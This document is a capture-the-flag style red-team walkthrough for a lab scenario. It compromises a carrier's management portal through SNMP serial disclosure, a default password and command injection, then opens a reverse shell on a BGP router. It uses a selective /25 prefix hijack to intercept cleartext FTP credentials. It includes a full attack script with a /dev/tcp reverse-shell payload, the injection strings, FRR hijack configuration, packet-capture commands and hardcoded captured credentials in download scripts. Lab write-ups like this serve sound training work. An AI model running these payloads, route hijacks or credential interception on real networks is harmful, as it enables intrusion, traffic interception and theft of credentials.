## Red Team Writeup : DakshinLink-BGPPrefixHijacking

**Component:** DakshinLink management portal and carrier Edge Router
**Attack chain:** SNMP information disclosure -> default credential recovery -> authenticated command injection -> router shell -> selective BGP prefix hijack -> FTP credential interception  
**MITRE ATT&CK:** T1046, T1018, T1190, T1059, T1016, T1557  
**Severity:** Critical / Insane

---

## 1. Overview - What, Why and How

DakshinLink Networks operates a network-management portal and an edge router named **R1** (DakshinLink's DR). R1 exchanges BGP routes with two other service-provider networks:

- **Vindhya Broadband**, whose network contains a recurring VIP FTP client.
- **Sahyadri Data Exchange**, whose network contains a protected FTP archive.

Under normal conditions, the Vindhya client reaches the Sahyadri FTP server through the direct connection between their two routers. That traffic does **not** pass through DakshinLink R1.

Your initial objective is to compromise DakshinLink's management chain. The public portal exposes a device serial number through weak SNMP configuration. The same serial number is still used as the portal's default administrator password. After login, a diagnostic feature contains command injection.

The diagnostic feature is important because it does not execute the command inside the web container. The portal first connects to **R1 over SSH**, then executes the diagnostic command on R1. When the injected command starts a reverse shell, the reverse shell therefore comes from **the R1 router container**.

Once on R1, your objective changes. You are no longer attacking the web application. You are controlling a real BGP-speaking router positioned beside the normal FTP route. You use BGP to convince Vindhya's router that R1 has a more specific path to the Sahyadri FTP subnet. Vindhya then sends its FTP requests through R1.

R1 still knows the legitimate route onward to Sahyadri, so it forwards the packets instead of dropping them. While the traffic passes through R1, you capture the clear-text FTP control connection and observe its `USER` and `PASS` commands.

In one sentence:

> Compromise the management portal, land on DakshinLink R1, selectively place R1 in the path of a real FTP session, and recover the password from live network traffic without stopping the service.

These 3 service-providers operate their own independent **Autonomous System (AS)**:

| Organisation | Scenario role | Autonomous system role |
|---|---|---|
| DakshinLink Networks | The assessed carrier whose R1 router is compromised | AS1, with a runtime-generated ASN |
| Vindhya Broadband | The provider containing the recurring VIP FTP client | AS2, with a runtime-generated ASN |
| Sahyadri Data Exchange | The provider containing the protected FTP archive | AS3, with a runtime-generated ASN |

An AS is not a single router. It is a network or group of IP prefixes operated under one routing policy. 

The actual AS numbers are unique for each participant. The labels **AS1**, **AS2**, and **AS3** describe their roles; as they are not fixed numeric ASNs.

<img width="1447" height="321" alt="image" src="https://github.com/user-attachments/assets/5daf8bf9-3be9-4443-8c26-dd62cfeaad5c" />

The three edge routers form a triangle:

- R1 has an eBGP peering with R2.
- R1 has an eBGP peering with R3.
- R2 also has a direct eBGP peering with R3.

The client is behind R2, and the FTP server is behind R3. 

<img width="732" height="430" alt="image" src="https://github.com/user-attachments/assets/70700cc5-ac58-406e-99d0-7c10cb76c20a" />


<img width="1041" height="673" alt="image" src="https://github.com/user-attachments/assets/72cf5103-311e-4a11-a4ba-da78185570a2" />

---

## 2. Prerequisites

- Kali Linux with `nmap`, `snmpwalk`, `curl`, Burp Suite, `nc`, `tcpdump` and Python 3
- Reachability to the assigned machine

Set only the specifc-supplied address:

```bash
export TARGET_IP="<assigned-challenge-vm-ip>"
```

## 3. Phase 1 - Black-box reconnaissance

### 3.1 Discover TCP services

```bash
nmap -Pn -sS -p- --min-rate 1500 "$TARGET_IP"

<img width="850" height="430" alt="image" src="https://github.com/user-attachments/assets/00b38a6d-d6e9-4aab-beec-0b98e0616bf8" />

```

Identify the HTTP management port from its page title and response:

```bash
export HTTP_PORT="<discovered-http-port>"
curl -i "http://${TARGET_IP}:${HTTP_PORT}/"

<img width="1455" height="804" alt="image" src="https://github.com/user-attachments/assets/11f99ceb-3b5d-4ec5-a30c-a18136cb776b" />

```

The login page displays error codes `45009` and `45010`. We do not know the password yet.
<img width="682" height="589" alt="image" src="https://github.com/user-attachments/assets/d9550390-1e02-4da3-bb85-2321721a94eb" />


### 3.2 Discover the UDP monitoring service

Use a complete UDP scan or narrow candidates identified by the platform's
network scan:

```bash
sudo nmap -Pn -sU --open -p- --min-rate 1000 "$TARGET_IP"
export SNMP_PORT="<discovered-snmp-port>"
sudo nmap -Pn -sU -sV -p "$SNMP_PORT" "$TARGET_IP"

To get the banner of running SNMP
sudo nmap -sU -p 18161 -sV --script=banner "$TARGET_IP"
```
<img width="1080" height="523" alt="image" src="https://github.com/user-attachments/assets/afcee966-2e65-455c-a87e-26cfcca21650" />

### 3.3 Enumerate web content

```bash
feroxbuster -u "http://${TARGET_IP}:${HTTP_PORT}/" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
<img width="1371" height="827" alt="image" src="https://github.com/user-attachments/assets/78b18243-31f9-4748-a49f-c591ed7966fb" />

Review:

- `/doc/`
- `/debug/`
- `/tools/remote.php`
<img width="1470" height="881" alt="image" src="https://github.com/user-attachments/assets/fce6bbdf-249a-4ac5-946f-bad9b58d557c" />
<img width="1236" height="321" alt="image" src="https://github.com/user-attachments/assets/800407f6-f75e-4aaf-a26c-3fcc2884d499" />
<img width="937" height="337" alt="image" src="https://github.com/user-attachments/assets/fef378c5-145d-4842-9d74-fa5bc8b1d0b6" />
<img width="1470" height="672" alt="image" src="https://github.com/user-attachments/assets/ead34e5c-5e70-42b8-adcc-d689a4369346" />

Download the error-code manual and topology:

```bash
curl -o error_codes.pdf "http://${TARGET_IP}:${HTTP_PORT}/doc/error_codes.pdf"
curl -o diagram_for_tac.png "http://${TARGET_IP}:${HTTP_PORT}/doc/diagram_for_tac.png"
```
<img width="1461" height="687" alt="image" src="https://github.com/user-attachments/assets/3d4f9259-c9e1-40ec-b567-ddef4f71bdba" />

Error `45009` explains that the default administrator password is the
device chassis serial. The topology image identifies the three live ASNs
and maps them to DakshinLink, Vindhya Broadband and Sahyadri Data Exchange.

## 4. Phase 2 - SNMP serial disclosure and portal access

Query the real SNMP agent using the intentionally weak default community:

```bash
snmpwalk -v1 -c public -t 3 -r 1 \
  "udp:${TARGET_IP}:${SNMP_PORT}" \
  .1.3.6.1.2.1.47.1.1.1.1.11
```
<img width="706" height="276" alt="image" src="https://github.com/user-attachments/assets/4d64af74-14a3-40c9-b74f-6d2364147a58" />

The queried OID (`.1.3.6.1.2.1.47.1.1.1.1.11`) corresponds to `entPhysicalSerialNum` in the standard Entity MIB. Security tools commonly query this OID to inventory network hardware and identify devices exposing insecure SNMP configurations.

Command breakdown:

- `snmpwalk`
  
  A command-line utility that queries an SNMP-enabled device and retrieves an entire tree of Management Information Base (MIB) objects rather than a single value.

- `-v1`
  
  Uses SNMP Version 1, an outdated protocol version that does not provide secure authentication or encryption.

- `-c public`
  
  Uses the community string `public`, the most common default read-only community string found on network devices.

- `-t 3`
  
  Sets the timeout to 3 seconds before considering the request unsuccessful.

- `-r 1`
  
  Sets the retry count to 1, meaning the request is retransmitted only once if no response is received.

- `"udp:${TARGET_IP}:${SNMP_PORT}"`
  
  Specifies the destination target using UDP, typically on port 161.

- `.1.3.6.1.2.1.47.1.1.1.1.11`

This information is commonly used during asset inventory, hardware identification, and security assessments to detect devices exposing sensitive hardware information through insecure SNMP configurations.

- Chassis
- Line cards
- Power supplies
- Other physical modules recognised by the Entity MIB

This information is commonly used during asset inventory, hardware identification, and security assessments to detect devices exposing sensitive hardware information through insecure SNMP configurations.

Extract the live serial:

```bash
export SERIAL="$(
  snmpwalk -v1 -c public -t 3 -r 1 \
    "udp:${TARGET_IP}:${SNMP_PORT}" \
    .1.3.6.1.2.1.47.1.1.1.1.11 \
  | sed -n 's/.*SN#\([^"]*\).*/\1/p' | head -n1
)"
printf 'SERIAL=%s\n' "$SERIAL"
```
<img width="868" height="312" alt="image" src="https://github.com/user-attachments/assets/ff329ae6-6a2e-4a1f-8051-dd893aa09ca6" />

Log in through a browser with:

```text
Username: admin
Password: <live serial returned by SNMP>
```
<img width="1378" height="653" alt="image" src="https://github.com/user-attachments/assets/655516d3-b888-4972-9564-8c9385eb187a" />
<img width="1326" height="870" alt="image" src="https://github.com/user-attachments/assets/837a707c-8064-4733-a093-5a817511a0b7" />

For a command-line session:

```bash
export COOKIE="$(mktemp)"
curl -sS -L -c "$COOKIE" -b "$COOKIE" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=$SERIAL" \
  "http://${TARGET_IP}:${HTTP_PORT}/index.php" \
  -o dashboard.html
grep -F "DakshinLink routing operations" dashboard.html
```
<img width="636" height="291" alt="image" src="https://github.com/user-attachments/assets/e7d67e0a-3442-4ace-8997-764c92dd4334" />

## 5. Phase 3 - Diagnostics command injection

<img width="1358" height="722" alt="image" src="https://github.com/user-attachments/assets/0affecc9-e168-460b-af21-b0e37bb5cb00" />

Open Diagnostics through Burp Suite and intercept the `POST /diag.php`
request. The hidden `check` value is base64 and decodes to `frr`:

```bash
printf '%s' '<captured-check-value>' | base64 -d
```
<img width="1469" height="808" alt="image" src="https://github.com/user-attachments/assets/41c62439-8e2e-4ef9-b6a9-71564f502581" />
<img width="510" height="183" alt="image" src="https://github.com/user-attachments/assets/e10955a0-957a-44bc-af0e-b3da70bbbc4e" />

The application builds a remote command in the form:

```text
ps aux | grep <decoded-check>
```
<img width="1144" height="344" alt="image" src="https://github.com/user-attachments/assets/c59e2041-d92e-4ff6-8dc6-13b7ad42670b" />

Terminate the expected command and append `id`:

```bash
export INJECTION_B64="$(printf '%s' ';id;hostname' | base64 -w0)"
curl -sS -b "$COOKIE" \
  --data-urlencode "check=$INJECTION_B64" \
  "http://${TARGET_IP}:${HTTP_PORT}/diag.php"
```
<img width="1470" height="593" alt="image" src="https://github.com/user-attachments/assets/48bfcc31-8d34-42e4-9ff5-505b55a48703" />
<img width="1470" height="769" alt="image" src="https://github.com/user-attachments/assets/ff676f7e-9619-48f8-826b-1ba11a15dde9" />
<img width="1470" height="829" alt="image" src="https://github.com/user-attachments/assets/39a2c4e3-dbbf-4a8e-b22f-65a20cdf98ed" />

The returned output proves command execution as `uid=0(root)` on the
DakshinLink router, not inside the web portal.

The supplied script performs the same live SNMP, login and diagnostic
request:

```bash
./Red-Team-Attack-Script.sh "$TARGET_IP" "$HTTP_PORT" "$SNMP_PORT" probe
```
<img width="870" height="333" alt="image" src="https://github.com/user-attachments/assets/21f5e1e6-e08b-4270-95d0-abfb08270251" />

```bash
#!/usr/bin/env bash
# External Carrier-style assessment client. Run on Kali, never on the challenge VM.
set -euo pipefail

usage(){
  cat <<'EOF'
Usage:
  ./Red-Team-Attack-Script.sh TARGET_IP HTTP_PORT SNMP_PORT probe
  ./Red-Team-Attack-Script.sh TARGET_IP HTTP_PORT SNMP_PORT command 'COMMAND'
  ./Red-Team-Attack-Script.sh TARGET_IP HTTP_PORT SNMP_PORT reverse LHOST LPORT

Modes:
  probe    Prove authenticated diagnostic command injection with id/hostname.
  command  Execute one supplied command through the vulnerable diagnostic transport.
  reverse  Trigger a reverse shell. Start a listener on LHOST:LPORT first.

Use LHOST=auto to derive the Kali source address selected for TARGET_IP.
EOF
}
[[ $# -ge 4 ]] || { usage; exit 2; }
TARGET_IP="$1"; HTTP_PORT="$2"; SNMP_PORT="$3"; MODE="$4"; shift 4
[[ "$HTTP_PORT" =~ ^[0-9]+$ && "$SNMP_PORT" =~ ^[0-9]+$ ]] || { echo "Ports must be numeric" >&2; exit 2; }
for tool in snmpwalk curl base64 ip; do command -v "$tool" >/dev/null || { echo "Missing tool: $tool" >&2; exit 3; }; done

COOKIE="$(mktemp)"
trap 'rm -f "$COOKIE"' EXIT
OID=".1.3.6.1.2.1.47.1.1.1.1.11"
SERIAL="$(
  snmpwalk -v1 -c public -t 3 -r 1 \
    "udp:${TARGET_IP}:${SNMP_PORT}" "$OID" 2>/dev/null \
    | sed -n 's/.*SN#\([^"]*\).*/\1/p' | head -n 1
)"
[[ -n "$SERIAL" ]] || { echo "Serial number was not returned by SNMP" >&2; exit 4; }
printf '[+] SNMP serial: %s\n' "$SERIAL"

curl -fsS -L --max-time 10 \
  -c "$COOKIE" -b "$COOKIE" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=$SERIAL" \
  "http://${TARGET_IP}:${HTTP_PORT}/index.php" \
  | grep -q "DakshinLink routing operations" \
  || { echo "Portal authentication failed" >&2; exit 5; }
echo "[+] Portal authentication succeeded"

case "$MODE" in
  probe)
    REMOTE_COMMAND=";id;hostname;vtysh -c 'show bgp ipv4 unicast summary'"
    ;;
  command)
    [[ $# -eq 1 ]] || { usage; exit 2; }
    REMOTE_COMMAND=";$1"
    ;;
  reverse)
    [[ $# -eq 2 ]] || { usage; exit 2; }
    LHOST="$1"; LPORT="$2"
    [[ "$LPORT" =~ ^[0-9]+$ ]] || { echo "LPORT must be numeric" >&2; exit 2; }
    if [[ "$LHOST" == auto ]]; then
      LHOST="$(ip -4 route get "$TARGET_IP" | awk '{for(i=1;i<=NF;i++)if($i=="src"){print $(i+1);exit}}')"
    fi
    [[ -n "$LHOST" ]] || { echo "Unable to determine LHOST" >&2; exit 6; }
    printf '[*] Listener must already be running: nc -lvnp %s\n' "$LPORT"
    SHELL_CODE="bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'"
    SHELL_B64="$(printf '%s' "$SHELL_CODE" | base64 -w 0)"
    REMOTE_COMMAND=";echo ${SHELL_B64}|base64 -d|bash"
    ;;
  *)
    usage
    exit 2
    ;;
esac

CHECK_B64="$(printf '%s' "$REMOTE_COMMAND" | base64 -w 0)"
if [[ "$MODE" == reverse ]]; then
  curl -sS --max-time 7 -b "$COOKIE" \
    --data-urlencode "check=$CHECK_B64" \
    "http://${TARGET_IP}:${HTTP_PORT}/diag.php" >/dev/null || true
  echo "[+] Reverse-shell diagnostic request sent"
else
  curl -fsS --max-time 20 -b "$COOKIE" \
    --data-urlencode "check=$CHECK_B64" \
    "http://${TARGET_IP}:${HTTP_PORT}/diag.php" \
    | sed -n '/<pre>/,/<\/pre>/p' \
    | sed -e 's/<[^>]*>//g' -e 's/&gt;/>/g' -e 's/&lt;/</g' -e 's/&amp;/\&/g'
fi
```
<img width="1144" height="399" alt="image" src="https://github.com/user-attachments/assets/25d66e7f-2496-42ca-a3a9-a435b2434b81" />
<img width="893" height="299" alt="image" src="https://github.com/user-attachments/assets/2b305c08-ed1d-4389-9e8a-b28386adcb2e" />

## 6. Phase 4 - Obtain an interactive router shell

Derive the Kali address actually selected for the target:

```bash
export LHOST="$(
  ip -4 route get "$TARGET_IP" |
  awk '{for(i=1;i<=NF;i++)if($i=="src"){print $(i+1);exit}}'
)"
export LPORT="$(
  python3 - <<'PY'
import socket
s = socket.socket()
s.bind(("", 0))
print(s.getsockname()[1])
s.close()
PY
)"
printf 'LHOST=%s LPORT=%s\n' "$LHOST" "$LPORT"
```
Start the listener first:

```bash
nc -lvnp "$LPORT"
```

In another terminal:

```bash
./Red-Team-Attack-Script.sh \
  "$TARGET_IP" "$HTTP_PORT" "$SNMP_PORT" \
  reverse "$LHOST" "$LPORT"
```
<img width="799" height="211" alt="image" src="https://github.com/user-attachments/assets/f97f7f57-b8cf-46ee-aa04-c05ee12b1d2b" />

Confirm the shell:

```bash
id
hostname
ip -br address
```
<img width="799" height="365" alt="image" src="https://github.com/user-attachments/assets/847cb492-877a-4b3a-ae34-168f47ea3224" />

## 7. Phase 5 - Understand the live BGP topology

### 7.1 What does “BGP hijack” mean here?

R3 legitimately announces the entire FTP subnet as one `/24` route.

R1 later announces two `/25` routes that together cover the same `/24`. A `/25` is more specific than a `/24`. IP forwarding uses the **longest-prefix match**, so R2 sends matching traffic toward R1 even though R2 still has a direct, shorter AS path to R3 for the `/24`.

This is a selective route interception:

- R1 claims a more specific route only to the client-side AS.
- R2 sends FTP traffic to R1.
- R1 forwards that traffic to the real R3 network.
- The service continues working.
- R1 can inspect the clear-text FTP login.

<img width="1045" height="530" alt="image" src="https://github.com/user-attachments/assets/0bf8f932-0f0b-4268-9074-af0c8f18b340" />

### 7.2 Why advertise two `/25` routes?

A `/24` contains 256 IPv4 addresses. Splitting it once produces two `/25` networks, each containing half of the original address space.

The ticket reveals the protected subnet but not necessarily the exact server address. Advertising both halves ensures that whichever half contains the server is redirected while still using routes more specific than the legitimate `/24`.

### 7.3 Why are `no-export` and the AS3 deny policy required?

R1 must attract the client traffic without teaching R3 to send its own FTP-subnet traffic back toward the attacker.

Two protections are used:

- `set community no-export` tells R2 not to re-advertise the two `/25` routes outside its own AS.
- `route-map TO-AS3 deny 10` prevents R1 from advertising those `/25` routes directly to R3.

Without these controls, R3 could learn a more-specific route to its own FTP network and forward matching traffic away from the real server. The result could be a routing loop or a black hole.

The support ticket identifies a protected FTP **subnet**, but not a
password. Record the subnet exactly:

```bash
export FTP_SUBNET="<subnet-from-ticket-6>"
```
<img width="710" height="182" alt="image" src="https://github.com/user-attachments/assets/f13db075-e79a-4a39-9c49-d80414cb255e" />

On the router shell:

```bash
vtysh 
show running-config
```
<img width="1333" height="874" alt="image" src="https://github.com/user-attachments/assets/34d2a701-14d8-4d9a-89da-9fd66cd5b56e" />

```bash
show bgp ipv4 unicast summary
show bgp ipv4 unicast
ip -4 route
```
<img width="1281" height="635" alt="image" src="https://github.com/user-attachments/assets/8415bc7c-c812-44c3-a8e5-7ace04aae436" />


Map each neighbor ASN to the organisation shown in
`diagram_for_tac.png`. Record:

```bash
export LOCAL_AS="<DakshinLink-AS-from-live-output>"
export CLIENT_PEER="<Vindhya-neighbor-IP>"
export SERVER_PEER="<Sahyadri-neighbor-IP>"
```
<img width="844" height="162" alt="image" src="https://github.com/user-attachments/assets/e2e21232-439b-41ff-be86-8bd7425adce3" />

Before exploitation, DakshinLink learns the FTP `/24` from the server AS,
while the client AS also has a shorter direct path to that server AS.

## 8. Phase 6 - Build the selective more-specific hijack

So, there's a user on AS65508 (Vindhya Broadband) connecting to a server on the 10.117.117.0/24 network (the server is 10.117.117.10, which we will be identifying further and is the IP address of the br-f085181eb522 interface on the host OS). We can't initially see his traffic because the traffic is sent directly from AS65508 to AS64655 (Sahyadri Data Exchange) (we are on AS64592).

<img width="735" height="489" alt="image" src="https://github.com/user-attachments/assets/622f5d53-3f8b-4714-9534-e9f1c50d26fc" />

The idea is to inject more specific routes for the 10.117.117.0/24 network so the router of Vindhya Broadband (R2) will send traffic to us at r1 (DakshinLink Router). Then once we get the traffic we'll send it back out towards Sahyadri's Router because we already have a BGP route from Sahyadri Router (R3) for the 10.117.117.0/24 network.

There's a small twist to this: when we send the more specific route (we can use a /25 or anything smaller than a /24), we must ensure that this route is not sent from r2 to r3 otherwise r3 will blackhole traffic towards the router since it received a more specific route. To do this, we can add the no-export BGP community to the route sent to r2, so the route won't be re-advertised to other systems.

We can see below that the best route for the 10.117.117.0/24 network is from AS64655 (10.187.52.35).

<img width="1185" height="712" alt="image" src="https://github.com/user-attachments/assets/52db6914-bf1b-4d35-a994-77c39265efb4" />

Split the discovered FTP `/24` into two `/25` networks:

```bash
read -r PREFIX_A PREFIX_B < <(
  python3 - "$FTP_SUBNET" <<'PY'
import ipaddress, sys
halves = list(ipaddress.ip_network(sys.argv[1], strict=False).subnets(prefixlen_diff=1))
print(halves[0], halves[1])
PY
)
printf 'PREFIX_A=%s\nPREFIX_B=%s\n' "$PREFIX_A" "$PREFIX_B"
```
<img width="859" height="374" alt="image" src="https://github.com/user-attachments/assets/2010d774-d0e7-4985-bfbd-b51c8585e8ee" />

Apply the route policy from the router shell, We'll change the route-map to add no-export to routes sent to AS65508, then advertise the 10.117.117.0/24 network::

```bash
vtysh
configure terminal
ip prefix-list HIJACK seq 5 permit 10.117.117.0/25
ip prefix-list HIJACK seq 10 permit 10.117.117.128/25
route-map TO-AS2 permit 10
match ip address prefix-list HIJACK
set community no-export
route-map TO-AS2 permit 20
route-map TO-AS3 deny 10
match ip address prefix-list HIJACK
route-map TO-AS3 permit 20
router bgp 64592
network 10.117.117.0/25
network 10.117.117.128/25
end
```
<img width="762" height="653" alt="image" src="https://github.com/user-attachments/assets/80759150-7750-457a-8a19-a2b20fcb79a3" />

After changing the route-map, we can issue a *clear bgp 10.195.138.251 soft out* command to refresh the outbound filter policies without resetting the entire BGP adjacency. We can now see that we are advertising the /25 route towards AS65508:

```bash
clear bgp 10.195.138.251 soft out

show bgp ipv4 unicast neighbors 10.195.138.251 advertised-routes"
show bgp ipv4 unicast neighbors 10.187.52.35 advertised-routes"
```
<img width="784" height="382" alt="image" src="https://github.com/user-attachments/assets/1c09dde9-15a6-4ef8-81fd-ed6febf66366" />

<img width="821" height="665" alt="image" src="https://github.com/user-attachments/assets/982ed564-364d-4278-b18c-9eb0c66f634e" />

Note: The two `/25` routes must be visible toward the client peer and absent
toward the server peer.

## 9. Phase 7 - Intercept the real FTP authentication

The recurring client now sends traffic through the compromised router.
Capture only real FTP control traffic for the discovered network:

```bash
tcpdump -ni any -A "dst net $FTP_SUBNET and tcp dst port 21"
```
<img width="1469" height="855" alt="image" src="https://github.com/user-attachments/assets/c0753eb5-2b44-4889-84cd-e970b4db1079" />


Wait for the next scheduled transfer. Record the clear-text lines:

```text
USER <live-user>
PASS <live-password>
```
<img width="1470" height="683" alt="image" src="https://github.com/user-attachments/assets/3181eaa5-5fd4-41cd-8928-f4ca198bd596" />
<img width="1470" height="355" alt="image" src="https://github.com/user-attachments/assets/aed77942-14c9-40ad-9134-5745835977a1" />


Identify the FTP server address from the same packet capture, then confirm
that the intercepted account is also valid for the protected host:

```bash
export FTP_SERVER_IP="<server-address-from-live-packets>"
export FTP_USER="<value-after-USER>"
ssh "${FTP_USER}@${FTP_SERVER_IP}"
cat archive/network-operations-archive.txt
```
OR

List the FTP files:
```bash
python3 - <<'PY'
from ftplib import FTP

host = "10.117.117.10"
username = "ops_913a98"
password = "afe5c5021b3378377563"

with FTP() as ftp:
    ftp.connect(host, 21, timeout=10)
    ftp.login(username, password)
    ftp.set_pasv(True)

    print("[+] Authentication successful")
    print("[+] Available files:")
    ftp.retrlines("LIST")
PY
```
<img width="762" height="695" alt="image" src="https://github.com/user-attachments/assets/688a06e1-d47b-4ef0-bfbf-31db983421cc" />

After finding the filename, download it using:
```bash
python3 - "$FILE_NAME" <<'PY'
from ftplib import FTP
from pathlib import Path
import sys

host = "10.117.117.10"
username = "ops_913a98"
password = "afe5c5021b3378377563"
remote_name = sys.argv[1]
local_name = Path(remote_name).name

with FTP() as ftp:
    ftp.connect(host, 21, timeout=10)
    ftp.login(username, password)
    ftp.set_pasv(True)

    with open(local_name, "wb") as output:
        ftp.retrbinary(f"RETR {remote_name}", output.write)

print(f"[+] Downloaded: {local_name}")
PY
```
<img width="793" height="855" alt="image" src="https://github.com/user-attachments/assets/b6f45159-9fee-49d0-bccf-49fa784c5b0e" />

This final access is performed from the compromised R1 router because the
protected host is part of the hidden carrier topology.

<img width="964" height="191" alt="image" src="https://github.com/user-attachments/assets/332a8c8e-c73c-462b-a93d-1e1e7933bf03" />

## 10. Evidence checklist

- TCP and UDP reconnaissance
- SNMP serial response
- Successful portal login
- Command-injection response showing root execution
- Router shell and live BGP summary
- Dynamically discovered three-AS mapping and FTP subnet
- Two `/25` advertisements toward the client AS only
- Packet capture showing real FTP `USER` and `PASS`

## 11. Cleanup

Remove only the routes and policy sequences added during exploitation:

```bash
vtysh \
  -c "configure terminal" \
  -c "router bgp $LOCAL_AS" \
  -c "no network $PREFIX_A" \
  -c "no network $PREFIX_B" \
  -c "exit" \
  -c "no route-map TO-AS2 permit 10" \
  -c "no route-map TO-AS3 deny 10" \
  -c "no ip prefix-list HIJACK" \
  -c "end" \
  -c "clear bgp $CLIENT_PEER soft out"
```

Close the reverse shell and confirm that legitimate BGP sessions and the
FTP workflow remain operational.

## 12. Common mistakes

1. Hardcoding a callback address instead of deriving the Kali source IP.
2. Treating the topology diagram's values as static across deployments.
3. Advertising the `/25` routes to the server AS.
4. Omitting `no-export`, allowing the client AS to leak the routes.
5. Blackholing the prefixes locally instead of preserving transit forwarding.
6. Capturing on Kali rather than on the compromised transit router.
7. Submitting a package value instead of the `PASS` observed in live traffic.

